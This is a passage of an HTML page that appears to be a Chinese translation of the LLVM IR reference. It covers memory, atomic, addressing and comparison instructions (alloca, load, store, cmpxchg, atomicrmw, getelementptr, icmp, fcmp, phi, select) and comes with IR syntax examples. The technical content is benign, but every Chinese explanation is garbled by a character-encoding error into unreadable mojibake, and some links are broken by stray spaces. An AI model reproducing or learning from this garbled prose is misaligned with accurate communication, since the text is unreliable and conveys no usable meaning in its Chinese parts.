&lt;idx&gt;&#125;*</code>å¸¸é‡ç´¢å¼•å€¼ï¼Œæå–æŒ‡å®šç´¢å¼•å¤„çš„å…ƒç´ ã€‚</li></ul><p><code>insertvalue</code>â€™æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-struct">struct</a> æˆ– [array](<a href="https://llvm.org/">https://llvm.org/</a> docs/LangRef.html#t-array) ç±»å‹ã€‚ ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯è¦æ’å…¥çš„ä¸€ç­‰å€¼ã€‚ ä»¥ä¸‹æ“ä½œæ•°æ˜¯å¸¸é‡ç´¢å¼•ï¼ŒæŒ‡ç¤ºæ’å…¥å€¼çš„ä½ç½®ï¼Œå…¶æ–¹å¼ä¸<code>extractvalue</code>æŒ‡ä»¤ä¸­çš„ç´¢å¼•ç±»ä¼¼ã€‚ è¦æ’å…¥çš„å€¼å¿…é¡»ä¸ç´¢å¼•æ ‡è¯†çš„å€¼å…·æœ‰ç›¸åŒçš„ç±»å‹ã€‚</p><p><strong>Semantics:</strong></p><p>The result is an aggregate of the same type as <code>val</code>. Its value is that of <code>val</code> except that the value at the position specified by the indices is that of <code>elt</code>.</p><p>ç»“æœæ˜¯ä¸ <code>val</code> ç±»å‹ç›¸åŒçš„èšåˆã€‚ å®ƒçš„å€¼æ˜¯<code>val</code>çš„å€¼ï¼Œåªæ˜¯ç´¢å¼•æŒ‡å®šä½ç½®çš„å€¼æ˜¯<code>elt</code>çš„å€¼ã€‚</p><pre class="language-none"><code class="language-none">#Example:%agg1 &#x3D; insertvalue &#123;i32, float&#125; undef, i32 1, 0              ; yields &#123;i32 1, float undef&#125;%agg2 &#x3D; insertvalue &#123;i32, float&#125; %agg1, float %val, 1         ; yields &#123;i32 1, float %val&#125;%agg3 &#x3D; insertvalue &#123;i32, &#123;float&#125;&#125; undef, float %val, 1, 0    ; yields &#123;i32 undef, &#123;float %val&#125;&#125;</code></pre><h3 id="å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ-Memory-Access-and-Addressing-Operations">å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ(<a href="https://llvm.org/docs/LangRef.html#id1959">Memory Access and Addressing Operations</a>)</h3><h4 id="alloca">alloca</h4><p><code>alloca</code>æŒ‡ä»¤åœ¨å½“å‰æ‰§è¡Œå‡½æ•°çš„æ ˆå¸§ä¸Šåˆ†é…å†…å­˜</p><ul><li><code>&lt;type&gt;</code>æŒ‡ä»¤è¿”å›çš„æŒ‡é’ˆç±»å‹ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç±»å‹ã€‚</li><li><code>&lt;ty&gt; &lt;NumElements&gt;</code>è¦åˆ†é…çš„å†…å­˜æ•°é‡ï¼Œåˆ†é…çš„å†…å­˜å¤§å°å°±æ˜¯è¯¥æ•°é‡*å•ä¸ªç±»å‹ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œé»˜è®¤æƒ…å†µä¸‹è¯¥å€¼ä¸º1ã€‚</li><li><code>align &lt;alignment&gt;</code>å†…å­˜å¯¹é½å€¼ã€‚å¦‚æœæŒ‡å®šäº†å¯¹é½å€¼ï¼Œå¯¹é½å€¼ä¸èƒ½å¤§äº1 &lt;&lt; 29ï¼Œä¸”ä¿è¯åˆ†é…çš„å€¼ç»“æœè‡³å°‘ä¸è¯¥è¾¹ç•Œå¯¹é½ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šæˆ–è€…å¯¹é½å€¼ä¸ºé›¶ï¼Œç›®æ ‡å¯ä»¥é€‰æ‹©åœ¨ä»»ä½•ä¸ç±»å‹å…¼å®¹çš„èŒƒå›´å†…å¯¹é½åˆ†é…ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; alloca [inalloca] &lt;type&gt; [, &lt;ty&gt; &lt;NumElements&gt;] [, align &lt;alignment&gt;] [, addrspace(&lt;num&gt;)]     ; yields type addrspace(num)*:result#Example%ptr &#x3D; alloca i32                             ; yields i32*:ptr%ptr &#x3D; alloca i32, i32 4                      ; yields i32*:ptr%ptr &#x3D; alloca i32, i32 4, align 1024          ; yields i32*:ptr%ptr &#x3D; alloca i32, align 1024                 ; yields i32*:ptr</code></pre><h4 id="load">load</h4><p><code>load</code>æŒ‡ä»¤ç”¨äºä»å†…å­˜ä¸­è¯»å–ã€‚</p><ul><li><code>&lt;result&gt;</code>æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå˜é‡çš„å€¼æ˜¯ä»å†…å­˜ä¸­åŠ è½½å‡ºæ¥çš„å€¼ã€‚</li><li><code>load &lt;ty&gt;</code>åŠ è½½ç±»å‹ï¼Œä¹Ÿå°±æ˜¯å‰é¢å˜é‡çš„ç±»å‹ã€‚</li><li><code>&lt;ty&gt;* &lt;pointer&gt;</code>æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘è¦åŠ è½½çš„å†…å­˜ï¼ŒæŒ‡é’ˆçš„ç±»å‹å¿…é¡»æ˜¯ä¸åŒ…å«ä¸é€æ˜ç»“æ„(opaque structural type)çš„first class typeç±»å‹ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; load [volatile] &lt;ty&gt;, &lt;ty&gt;* &lt;pointer&gt;[, align &lt;alignment&gt;][, !nontemporal !&lt;nontemp_node&gt;][, !invariant.load !&lt;empty_node&gt;][, !invariant.group !&lt;empty_node&gt;][, !nonnull !&lt;empty_node&gt;][, !dereferenceable !&lt;deref_bytes_node&gt;][, !dereferenceable_or_null !&lt;deref_bytes_node&gt;][, !align !&lt;align_node&gt;][, !noundef !&lt;empty_node&gt;]&lt;result&gt; &#x3D; load atomic [volatile] &lt;ty&gt;, &lt;ty&gt;* &lt;pointer&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;, align &lt;alignment&gt; [, !invariant.group !&lt;empty_node&gt;]!&lt;nontemp_node&gt; &#x3D; !&#123; i32 1 &#125;!&lt;empty_node&gt; &#x3D; !&#123;&#125;!&lt;deref_bytes_node&gt; &#x3D; !&#123; i64 &lt;dereferenceable_bytes&gt; &#125;!&lt;align_node&gt; &#x3D; !&#123; i64 &lt;value_alignment&gt; &#125;#Example%ptr &#x3D; alloca i32                               ; yields i32*:ptrstore i32 3, i32* %ptr                          ; yields void%val &#x3D; load i32, i32* %ptr                      ; yields i32:val &#x3D; i32 3</code></pre><h4 id="store">store</h4><p><code>store</code> æŒ‡ä»¤ç”¨äºå†™å…¥å†…å­˜ã€‚</p><p>å­˜å‚¨æŒ‡ä»¤æœ‰ä¸¤ä¸ªå‚æ•°ï¼šè¦å­˜å‚¨çš„å€¼å’Œå­˜å‚¨å®ƒçš„åœ°å€ã€‚</p><ul><li><code>&lt;ty&gt; &lt;value&gt;</code>è¦å­˜å…¥çš„å€¼ï¼Œå€¼çš„ç±»å‹å¿…é¡»æ˜¯å·²çŸ¥é•¿åº¦çš„first class typeã€‚</li><li><code>&lt;ty&gt;* &lt;pointer&gt;</code>æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€å—å­˜å€¼çš„åœ°å€ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax:store [volatile] &lt;ty&gt; &lt;value&gt;, &lt;ty&gt;* &lt;pointer&gt;[, align &lt;alignment&gt;][, !nontemporal !&lt;nontemp_node&gt;][, !invariant.group !&lt;empty_node&gt;]        ; yields voidstore atomic [volatile] &lt;ty&gt; &lt;value&gt;, &lt;ty&gt;* &lt;pointer&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;, align &lt;alignment&gt; [, !invariant.group !&lt;empty_node&gt;] ; yields void!&lt;nontemp_node&gt; &#x3D; !&#123; i32 1 &#125;!&lt;empty_node&gt; &#x3D; !&#123;&#125;# Example%ptr &#x3D; alloca i32                               ; yields i32*:ptrstore i32 3, i32* %ptr                          ; yields void%val &#x3D; load i32, i32* %ptr                      ; yields i32:val &#x3D; i32 3</code></pre><h4 id="fence">fence</h4><p><code>fence</code>æŒ‡ä»¤å¸¦æœ‰ä¸€ä¸ªæ’åºå‚æ•°ï¼Œå®ƒå®šä¹‰äº†ä¸å®ƒä»¬æ·»åŠ çš„è¾¹åŒæ­¥çš„å†…å®¹ã€‚ åªèƒ½ç»™å®ƒä»¬<code>acquire</code>, <code>release</code>, <code>acq_rel</code>, <code>seq_cst</code>æ’åºã€‚</p><pre class="language-none"><code class="language-none">#Syntaxfence [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;  ; yields void#Exmaplefence acquire                                        ; yields voidfence syncscope(&quot;singlethread&quot;) seq_cst              ; yields voidfence syncscope(&quot;agent&quot;) seq_cst                     ; yields void</code></pre><h4 id="cmpxchg">cmpxchg</h4><p><code>cmpxchg</code>æŒ‡ä»¤ç”¨äºåŸå­åœ°ä¿®æ”¹å†…å­˜ã€‚ å®ƒåœ¨å†…å­˜ä¸­åŠ è½½ä¸€ä¸ªå€¼å¹¶å°†å…¶ä¸ç»™å®šå€¼è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœå®ƒä»¬ç›¸ç­‰ï¼Œå®ƒä¼šå°è¯•å°†æ–°å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:cmpxchg [weak] [volatile] &lt;ty&gt;* &lt;pointer&gt;, &lt;ty&gt; &lt;cmp&gt;, &lt;ty&gt; &lt;new&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;success ordering&gt; &lt;failure ordering&gt;[, align &lt;alignment&gt;] ; yields  &#123; ty, i1 &#125;#Exampleentry:  %orig &#x3D; load atomic i32, i32* %ptr unordered, align 4                      ; yields i32  br label %looploop:  %cmp &#x3D; phi i32 [ %orig, %entry ], [%value_loaded, %loop]  %squared &#x3D; mul i32 %cmp, %cmp  %val_success &#x3D; cmpxchg i32* %ptr, i32 %cmp, i32 %squared acq_rel monotonic ; yields  &#123; i32, i1 &#125;  %value_loaded &#x3D; extractvalue &#123; i32, i1 &#125; %val_success, 0  %success &#x3D; extractvalue &#123; i32, i1 &#125; %val_success, 1  br i1 %success, label %done, label %loopdone:  ...</code></pre><h4 id="atomicrmw">atomicrmw</h4><p><code>atomicrmw</code>æŒ‡ä»¤ç”¨äºåŸå­åœ°ä¿®æ”¹å†…å­˜ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:atomicrmw [volatile] &lt;operation&gt; &lt;ty&gt;* &lt;pointer&gt;, &lt;ty&gt; &lt;value&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;[, align &lt;alignment&gt;]  ; yields ty</code></pre><p><code>atomicrmw</code>æŒ‡ä»¤æœ‰ä¸‰ä¸ªå‚æ•°ï¼šè¦åº”ç”¨çš„æ“ä½œã€è¦ä¿®æ”¹å…¶å€¼çš„åœ°å€ã€æ“ä½œçš„å‚æ•°ã€‚</p><ul><li>xchg: <code>*ptr = val</code></li><li>add: <code>*ptr = *ptr + val</code></li><li>sub: <code>*ptr = *ptr - val</code></li><li>and: <code>*ptr = *ptr &amp; val</code></li><li>nand: <code>*ptr = ~(*ptr &amp; val)</code></li><li>or: <code>*ptr = *ptr | val</code></li><li>xor: <code>*ptr = *ptr ^ val</code></li><li>max: <code>*ptr = *ptr &gt; val ? *ptr : val</code> (using a signed comparison)</li><li>min: <code>*ptr = *ptr &lt; val ? *ptr : val</code> (using a signed comparison)</li><li>umax: <code>*ptr = *ptr &gt; val ? *ptr : val</code> (using an unsigned comparison)</li><li>umin: <code>*ptr = *ptr &lt; val ? *ptr : val</code> (using an unsigned comparison)</li><li>fadd: <code>*ptr = *ptr + val</code> (using floating point arithmetic)</li><li>fsub: <code>*ptr = *ptr - val</code> (using floating point arithmetic)</li></ul><pre class="language-none"><code class="language-none">#Example:%old &#x3D; atomicrmw add i32* %ptr, i32 1 acquire                        ; yields i32</code></pre><h4 id="getelementptr">getelementptr</h4><p><code>getelementptr</code>æŒ‡ä»¤ç”¨äºè·å– <a href="https://llvm.org/docs/LangRef.html#t-aggregate">aggregate</a> æ•°æ®ç»“æ„çš„å­å…ƒç´ çš„åœ°å€ã€‚ å®ƒåªæ‰§è¡Œåœ°å€è®¡ç®—ï¼Œä¸è®¿é—®å†…å­˜ã€‚ è¯¥æŒ‡ä»¤è¿˜å¯ç”¨äºè®¡ç®—æ­¤ç±»åœ°å€çš„å‘é‡ã€‚</p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; getelementptr &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;*&lt;result&gt; &#x3D; getelementptr inbounds &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;*&lt;result&gt; &#x3D; getelementptr &lt;ty&gt;, &lt;ptr vector&gt; &lt;ptrval&gt;, [inrange] &lt;vector index type&gt; &lt;idx&gt;</code></pre><ul><li>ç¬¬ä¸€ä¸ª<code>&lt;ty&gt;</code>æ˜¯ç¬¬ä¸€ä¸ªç´¢å¼•<code>&lt;idx&gt;</code>ä½¿ç”¨çš„åŸºæœ¬ç±»å‹</li><li>ç¬¬äºŒä¸ª<code>&lt;ty&gt;*</code>è¡¨ç¤ºå…¶åçš„åŸºåœ°å€<code>ptrval</code>çš„ç±»å‹ã€‚</li><li><code>&lt;ty&gt; &lt;idx&gt;</code>æ˜¯ç¬¬ä¸€ç»„ç´¢å¼•çš„ç±»å‹å’Œå€¼ï¼Œ å¯ä»¥å‡ºç°å¤šæ¬¡ï¼Œå…¶åå‡ºç°å°±æ˜¯ç¬¬äºŒç»„ã€ç¬¬ä¸‰ç»„ç­‰ç­‰ç´¢å¼•çš„ç±»å‹å’Œå€¼ã€‚</li></ul><pre class="language-none"><code class="language-none">#Example:; yields [12 x i8]*:aptr%aptr &#x3D; getelementptr &#123;i32, [12 x i8]&#125;, &#123;i32, [12 x i8]&#125;* %saptr, i64 0, i32 1; yields i8*:vptr%vptr &#x3D; getelementptr &#123;i32, &lt;2 x i8&gt;&#125;, &#123;i32, &lt;2 x i8&gt;&#125;* %svptr, i64 0, i32 1, i32 1; yields i8*:eptr%eptr &#x3D; getelementptr [12 x i8], [12 x i8]* %aptr, i64 0, i32 1; yields i32*:iptr%iptr &#x3D; getelementptr [10 x i32], [10 x i32]* @arr, i16 0, i16 0</code></pre><h3 id="å…¶ä»–æ“ä½œ-Other-Operations">å…¶ä»–æ“ä½œ(<a href="https://llvm.org/docs/LangRef.html#id2082">Other Operations</a>)</h3><h4 id="icmp-æ•´æ•°æ¯”è¾ƒ">icmp æ•´æ•°æ¯”è¾ƒ</h4><p><code>icmp</code> æŒ‡ä»¤æ ¹æ®å…¶ä¸¤ä¸ªæ•´æ•°ã€æ•´æ•°å‘é‡ã€æŒ‡é’ˆæˆ–æŒ‡é’ˆå‘é‡æ“ä½œæ•°çš„æ¯”è¾ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼æˆ–ä¸€ä¸ªå¸ƒå°”å€¼å‘é‡ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; icmp &lt;cond&gt; &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields i1 or &lt;N x i1&gt;:result</code></pre><p><strong>Arguments:</strong></p><p>â€œicmpâ€æŒ‡ä»¤éœ€è¦ä¸‰ä¸ªæ“ä½œæ•°ã€‚ ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºè¦æ‰§è¡Œçš„æ¯”è¾ƒç±»å‹çš„å…³é”®å­—ï¼š</p><ol><li><code>eq</code>: equal</li><li><code>ne</code>: not equal</li><li><code>ugt</code>: unsigned greater than</li><li><code>uge</code>: unsigned greater or equal</li><li><code>ult</code>: unsigned less than</li><li><code>ule</code>: unsigned less or equal</li><li><code>sgt</code>: signed greater than</li><li><code>sge</code>: signed greater or equal</li><li><code>slt</code>: signed less than</li><li><code>sle</code>: signed less or equal</li></ol><p>The remaining two arguments must be <a href="https://llvm.org/docs/LangRef.html#t-integer">integer</a> or <a href="https://llvm.org/docs/LangRef.html#t-pointer">pointer</a> or integer <a href="https://llvm.org/docs/LangRef.html#t-vector">vector</a> typed. They must also be identical types.</p><ol><li><code>eq</code>: yields <code>true</code> if the operands are equal, <code>false</code> otherwise. No sign interpretation is necessary or performed.</li><li><code>ne</code>: yields <code>true</code> if the operands are unequal, <code>false</code> otherwise. No sign interpretation is necessary or performed.</li><li><code>ugt</code>: interprets the operands as unsigned values and yields <code>true</code> if <code>op1</code> is greater than <code>op2</code>.</li><li><code>uge</code>: interprets the operands as unsigned values and yields <code>true</code> if <code>op1</code> is greater than or equal to <code>op2</code>.</li><li><code>ult</code>: interprets the operands as unsigned values and yields <code>true</code> if <code>op1</code> is less than <code>op2</code>.</li><li><code>ule</code>: interprets the operands as unsigned values and yields <code>true</code> if <code>op1</code> is less than or equal to <code>op2</code>.</li><li><code>sgt</code>: interprets the operands as signed values and yields <code>true</code> if <code>op1</code> is greater than <code>op2</code>.</li><li><code>sge</code>: interprets the operands as signed values and yields <code>true</code> if <code>op1</code> is greater than or equal to <code>op2</code>.</li><li><code>slt</code>: interprets the operands as signed values and yields <code>true</code> if <code>op1</code> is less than <code>op2</code>.</li><li><code>sle</code>: interprets the operands as signed values and yields <code>true</code> if <code>op1</code> is less than or equal to <code>op2</code>.</li></ol><pre class="language-none"><code class="language-none">#Example&lt;result&gt; &#x3D; icmp eq i32 4, 5          ; yields: result&#x3D;false&lt;result&gt; &#x3D; icmp ne float* %X, %X     ; yields: result&#x3D;false&lt;result&gt; &#x3D; icmp ult i16  4, 5        ; yields: result&#x3D;true&lt;result&gt; &#x3D; icmp sgt i16  4, 5        ; yields: result&#x3D;false&lt;result&gt; &#x3D; icmp ule i16 -4, 5        ; yields: result&#x3D;false&lt;result&gt; &#x3D; icmp sge i16  4, 5        ; yields: result&#x3D;false</code></pre><h4 id="fcmp-æµ®ç‚¹æ•°æ¯”è¾ƒ">fcmp æµ®ç‚¹æ•°æ¯”è¾ƒ</h4><ul><li><p><code>fcmp</code>æŒ‡ä»¤æ ¹æ®å…¶æ“ä½œæ•°çš„æ¯”è¾ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼æˆ–å¸ƒå°”å€¼å‘é‡ã€‚</p></li><li><p>å¦‚æœæ“ä½œæ•°æ˜¯æµ®ç‚¹æ ‡é‡ï¼Œåˆ™ç»“æœç±»å‹ä¸ºå¸ƒå°”å€¼ (i1)ã€‚</p></li><li><p>å¦‚æœæ“ä½œæ•°æ˜¯æµ®ç‚¹å‘é‡ï¼Œåˆ™ç»“æœç±»å‹æ˜¯å¸ƒå°”å‘é‡ï¼Œå…¶å…ƒç´ æ•°é‡ä¸è¢«æ¯”è¾ƒçš„æ“ä½œæ•°ç›¸åŒã€‚</p></li></ul><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; fcmp [fast-math flags]* &lt;cond&gt; &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;     ; yields i1 or &lt;N x i1&gt;:result</code></pre><p><strong>Arguments:</strong></p><p><code>fcmp</code>â€™æŒ‡ä»¤éœ€è¦ä¸‰ä¸ªæ“ä½œæ•°ã€‚ ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºè¦æ‰§è¡Œçš„æ¯”è¾ƒç±»å‹çš„å…³é”®å­—ï¼š</p><ol><li><p><code>false</code>ï¼šä¸æ¯”è¾ƒï¼Œæ€»æ˜¯è¿”å›false</p></li><li><p><code>oeq</code>ï¼šæœ‰åºä¸”ç›¸ç­‰</p></li><li><p><code>ogt</code>ï¼šæœ‰åºä¸”å¤§äº</p></li><li><p><code>oge</code>ï¼šæœ‰åºä¸”å¤§äºç­‰äº</p></li><li><p><code>olt</code>ï¼šæœ‰åºä¸”å°äº</p></li><li><p><code>ole</code>ï¼šæœ‰åºä¸”å°äºæˆ–ç­‰äº</p></li><li><p><code>one</code>ï¼šæœ‰åºä¸”ä¸ç›¸ç­‰</p></li><li><p><code>ord</code>ï¼šæœ‰åº(éNASNï¼‰ yields <code>true</code> if both operands are not a QNAN.</p></li><li><p><code>ueq</code>ï¼šæ— åºæˆ–ç›¸ç­‰</p></li><li><p><code>ugt</code>ï¼šæ— åºæˆ–å¤§äº</p></li><li><p><code>uge</code>ï¼šæ— åºæˆ–å¤§äºç­‰äº</p></li><li><p><code>ult</code>ï¼šæ— åºæˆ–å°äº</p></li><li><p><code>ule</code>ï¼šæ— åºæˆ–å°äºç­‰äº</p></li><li><p><code>une</code>ï¼šæ— åºæˆ–ä¸ç›¸ç­‰</p></li><li><p><code>uno</code>ï¼šæ— åºï¼ˆéƒ½æ˜¯nansï¼‰   yields <code>true</code> if either operand is a QNAN.</p></li><li><p><code>true</code>ï¼šä¸æ¯”è¾ƒï¼Œæ€»æ˜¯è¿”å›true</p></li></ol><p><em>Ordered</em> è¡¨ç¤ºä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸æ˜¯ QNANï¼Œè€Œ <em>unordered</em> è¡¨ç¤ºä»»ä½•ä¸€ä¸ªæ“ä½œæ•°éƒ½å¯èƒ½æ˜¯ QNANã€‚</p><p>æ¯ä¸ª <code>val1</code> å’Œ <code>val2</code> å‚æ•°å¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-floating">floating-point</a> ç±»å‹æˆ– [vector](<a href="https://llvm">https://llvm</a> .org/docs/LangRef.html#t-vector) çš„æµ®ç‚¹ç±»å‹ã€‚ å®ƒä»¬å¿…é¡»å…·æœ‰ç›¸åŒçš„ç±»å‹ã€‚</p><p><strong>Semantics:</strong></p><p>The â€˜<code>fcmp</code>â€™ instruction compares <code>op1</code> and <code>op2</code> according to the condition code given as <code>cond</code>. If the operands are vectors, then the vectors are compared element by element. Each comparison performed always yields an <a href="https://llvm.org/docs/LangRef.html#t-integer">i1</a> result, as follows:</p><ol><li><code>false</code>: always yields <code>false</code>, regardless of operands.</li><li><code>oeq</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is equal to <code>op2</code>.</li><li><code>ogt</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is greater than <code>op2</code>.</li><li><code>oge</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is greater than or equal to <code>op2</code>.</li><li><code>olt</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is less than <code>op2</code>.</li><li><code>ole</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is less than or equal to <code>op2</code>.</li><li><code>one</code>: yields <code>true</code> if both operands are not a QNAN and <code>op1</code> is not equal to <code>op2</code>.</li><li><code>ord</code>: yields <code>true</code> if both operands are not a QNAN.</li><li><code>ueq</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is equal to <code>op2</code>.</li><li><code>ugt</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is greater than <code>op2</code>.</li><li><code>uge</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is greater than or equal to <code>op2</code>.</li><li><code>ult</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is less than <code>op2</code>.</li><li><code>ule</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is less than or equal to <code>op2</code>.</li><li><code>une</code>: yields <code>true</code> if either operand is a QNAN or <code>op1</code> is not equal to <code>op2</code>.</li><li><code>uno</code>: yields <code>true</code> if either operand is a QNAN.</li><li><code>true</code>: always yields <code>true</code>, regardless of operands.</li></ol><p><code>fcmp</code> æŒ‡ä»¤è¿˜å¯ä»¥é€‰æ‹©é‡‡ç”¨ä»»æ„æ•°é‡çš„ <a href="https://llvm.org/docs/LangRef.html#fastmath">fast-math æ ‡å¿—</a>ï¼Œå®ƒä»¬æ˜¯å¯ç”¨å…¶ä»–ä¸å®‰å…¨æµ®ç‚¹ä¼˜åŒ–çš„ä¼˜åŒ–æç¤ºã€‚</p><p>ä»»ä½•ä¸€ç»„å¿«é€Ÿæ•°å­¦æ ‡å¿—åœ¨â€œfcmpâ€æŒ‡ä»¤ä¸Šéƒ½æ˜¯åˆæ³•çš„ï¼Œä½†å”¯ä¸€å¯¹å…¶è¯­ä¹‰æœ‰ä»»ä½•å½±å“çš„æ ‡å¿—æ˜¯é‚£äº›å…è®¸å¯¹è¾“å…¥å‚æ•°çš„å€¼è¿›è¡Œå‡è®¾çš„æ ‡å¿—ï¼› å³<code>nnan</code>ã€<code>ninf</code>å’Œ<code>reassoc</code>ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://llvm.org/docs/LangRef.html#fastmath">Fast-Math æ ‡å¿—</a>ã€‚</p><pre class="language-none"><code class="language-none"># Example:&lt;result&gt; &#x3D; fcmp oeq float 4.0, 5.0    ; yields: result&#x3D;false&lt;result&gt; &#x3D; fcmp one float 4.0, 5.0    ; yields: result&#x3D;true&lt;result&gt; &#x3D; fcmp olt float 4.0, 5.0    ; yields: result&#x3D;true&lt;result&gt; &#x3D; fcmp ueq double 1.0, 2.0   ; yields: result&#x3D;false</code></pre><h4 id="phi">phi</h4><p><code>phi</code> æŒ‡ä»¤ç”¨äºå®ç° SSA å›¾ä¸­è¡¨ç¤ºå‡½æ•°çš„ Ï† èŠ‚ç‚¹ã€‚</p><p>åœ¨è¿è¡Œæ—¶ï¼Œ<code>phi</code>æŒ‡ä»¤åœ¨é€»è¾‘ä¸Šé‡‡ç”¨ä¸åœ¨å½“å‰å—ä¹‹å‰æ‰§è¡Œçš„å‰é©±åŸºæœ¬å—ç›¸å¯¹åº”çš„å¯¹æŒ‡å®šçš„å€¼ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;result&gt; &#x3D; phi [fast-math-flags] &lt;ty&gt; [ &lt;val0&gt;, &lt;label0&gt;], ...</code></pre><p><strong>Arguments:</strong></p><p>ä¼ å…¥å€¼çš„ç±»å‹ç”±ç¬¬ä¸€ä¸ªç±»å‹å­—æ®µæŒ‡å®šã€‚ åœ¨æ­¤ä¹‹åï¼Œ<code>phi</code>æŒ‡ä»¤å°†ä¸€å¯¹åˆ—è¡¨ä½œä¸ºå‚æ•°ï¼Œå…¶ä¸­ä¸€å¯¹ç”¨äºå½“å‰å—çš„æ¯ä¸ªå‰é©±åŸºæœ¬å—ã€‚ åªæœ‰ <a href="https://llvm.org/docs/LangRef.html#t-firstclass">first class</a> ç±»å‹çš„å€¼å¯ä»¥ç”¨ä½œ PHI èŠ‚ç‚¹çš„å€¼å‚æ•°ã€‚ åªæœ‰æ ‡ç­¾å¯ä»¥ç”¨ä½œæ ‡ç­¾å‚æ•°ã€‚</p><p>åœ¨åŸºæœ¬å—çš„å¼€å§‹å’Œ PHI æŒ‡ä»¤ä¹‹é—´ä¸èƒ½æœ‰é phi æŒ‡ä»¤ï¼šå³ PHI æŒ‡ä»¤å¿…é¡»åœ¨åŸºæœ¬å—ä¸­çš„ç¬¬ä¸€ä¸ªã€‚</p><p>å°± SSA å½¢å¼è€Œè¨€ï¼Œæ¯ä¸ªä¼ å…¥å€¼çš„ä½¿ç”¨éƒ½è¢«è®¤ä¸ºå‘ç”Ÿåœ¨ä»ç›¸åº”çš„å‰é©±å—åˆ°å½“å‰å—çš„è¾¹ä¸Šï¼ˆä½†åœ¨åŒä¸€è¾¹ä¸Šå®šä¹‰äº†â€œinvokeâ€æŒ‡ä»¤çš„è¿”å›å€¼ä¹‹åã€‚</p><pre class="language-none"><code class="language-none"># Example:Loop:       ; Infinite loop that counts from 0 on up...  %indvar &#x3D; phi i32 [ 0, %LoopHeader ], [ %nextindvar, %Loop ]  %nextindvar &#x3D; add i32 %indvar, 1  br label %Loop</code></pre><h4 id="select-æ¡ä»¶å€¼é€‰æ‹©">select æ¡ä»¶å€¼é€‰æ‹©</h4><p><code>select</code>æŒ‡ä»¤ç”¨äºæ ¹æ®æ¡ä»¶é€‰æ‹©ä¸€ä¸ªå€¼ï¼Œæ— éœ€ IR çº§åˆ†æ”¯ã€‚</p><ul><li><p>å¦‚æœæ¡ä»¶æ˜¯ i1 å¹¶ä¸”è®¡ç®—ç»“æœä¸º 1ï¼Œåˆ™æŒ‡ä»¤è¿”å›ç¬¬ä¸€ä¸ªå€¼å‚æ•°ï¼› å¦åˆ™ï¼Œå®ƒè¿”å›ç¬¬äºŒä¸ªå€¼å‚æ•°ã€‚</p></li><li><p>å¦‚æœæ¡ä»¶æ˜¯ i1 çš„å‘é‡ï¼Œåˆ™å€¼å‚æ•°å¿…é¡»æ˜¯ç›¸åŒå¤§å°çš„å‘é‡ï¼Œå¹¶ä¸”é€‰æ‹©æ˜¯é€ä¸ªå…ƒç´ å®Œæˆçš„ã€‚</p></li><li><p>å¦‚æœæ¡ä»¶æ˜¯ i1 å¹¶ä¸”å€¼å‚æ•°æ˜¯ç›¸åŒå¤§å°çš„å‘é‡ï¼Œåˆ™é€‰æ‹©æ•´ä¸ªå‘é‡ã€‚</p></li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; select [fast-math flags] selty &lt;cond&gt;, &lt;ty&gt; &lt;val1&gt;, &lt;ty&gt; &lt;val2&gt;             ; yields ty selty is either i1 or &#123;&lt;N x i1&gt;&#125;#Example:%X &#x3D; select i1 true, i8 17, i8 42          ; yields i8:17</code></pre><h4 id="freeze">freeze</h4><p><code>freeze</code> 